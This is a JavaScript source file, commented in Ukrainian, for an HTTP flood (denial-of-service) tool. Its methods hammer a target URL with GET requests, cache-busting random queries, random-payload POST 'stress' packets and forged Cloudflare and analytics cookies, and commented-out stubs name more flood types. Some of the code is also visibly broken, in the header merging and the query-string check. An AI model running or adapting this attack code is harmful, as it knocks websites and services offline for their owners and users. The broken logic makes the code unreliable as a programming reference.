const BASE_HEADERS = {
'Accept-Encoding':'gzip, deflate, br',
'Accept-Language':'en-US,en;q=0.9',
'Cache-Control':'max-age=0',
'Connection':'Keep-Alive',
'Sec-Fetch-Dest':'document',
'Sec-Fetch-Mode':'navigate',
'Sec-Fetch-Site':'none',
'Sec-Fetch-User':'?1',
'Sec-Gpc':'1',
'Pragma':'no-cache',
'Upgrade-Insecure-Requests': '1'
};

const BASIC_MODES = {
	mode: 'no-cors',
	referrerPolicy: 'no-referrer',
	cache: 'no-cache',
	expires: 0
};

const POST = {method: "POST"};
const GET = {method: "GET"};

const MIME = {
	json: "application/json",
	xml: "application/xml"
};


/**
 * Змішування заголовків
 * @param {JSON} headers 
 */
const composeHeaders = headers => Object(...BASE_HEADERS, ...headers);

/**
 * Змішування заголовків для POST запитів
 * @param {Number} cl **Довжина запиту**
 * @param {String} ct **Тип запиту**
 * @param {String} body **Тіло запиту**
 * @returns JSON
 */
function composePostHeaders(cl, ct, body) {
	return {
		...POST,
		headers: composeHeaders(
			{
				'Content-Length': cl,
				'X-Requested-With': 'XMLHttpRequest',
				'Content-Type': ct
			}
		),
		body: body
	}
};

/**
 * Генератор POST запиту
 * @param {String} url **URL-Адреса**
 */
const composeURL = url => !url.search(/\?/) ? url + `?data=${randomString(64)}` : url;


/**
 * Генератор пакету
 * @param {Number} size **Вага ~~бомби~~ пакету**
 * @param {MIME<string>} type **Тип запиту**
 * @returns {String}
 */
const Packet = (size, type) => (r=>type!=MIME.json?r:[MIME.json,`{"data": "${r}"}`])(randomString(size));


/**
 * Генератор запиту
 * @param {String} target **Ціль**
 * @param {JSON} config **Конфіг**
 */
async function request(target, config) {
	return await fetch(
		target,
		{...BASIC_MODES, ...config}
	)
	.catch(()=>{})
	.then(add_count);
};

/**
 * Методи
 */
class Methods {
	/**
	 * Конструктор
	 * @param {String} target **Ціль**
	 */
	constructor(target) {
		this.target = [target]
	} 
	async GET() {
		return await request(this.target[0], GET)
	}
	async RGET() {
		return await request(composeURL(this.target[0]), GET)
	}
	async POST() {
		return await request(this.target[0], 
			composePostHeaders(76, ...Packet(64, MIME.json))
		)
	}
	async STRESS(big_packets) {
		return await request(this.target[0], 
			big_packets?
			composePostHeaders(
				2060, ...Packet(2048, MIME.json)
			):
			composePostHeaders(
				524, ...Packet(512, MIME.json)
			)

		)
	}
	async COOKIE() {
		return await request(this.target[0], {
			...POST,
			headers: composeHeaders(
				{'Cookie': `_ga=GA${getRandomArbitrary(1000, 99999)};
				 _gat=1;
				 __cfduid=dc232334gwdsd23434542342342342475611928;
				 ${Packet(6)}=${Packet(32)}`}
			)
		})
	}
	/*
	async APACHE() {}
	async XMLRPC() {}
	async PPS() {}
	async DYN() {}
	async CFB() {}
	async EVEN() {}
	async SLOW() {}
	async TCP() {}
	async RHEX() {}
	async STOMP() {}
	async UDP() {}
	async VSE() {}
	async GET() {}
	*/
}

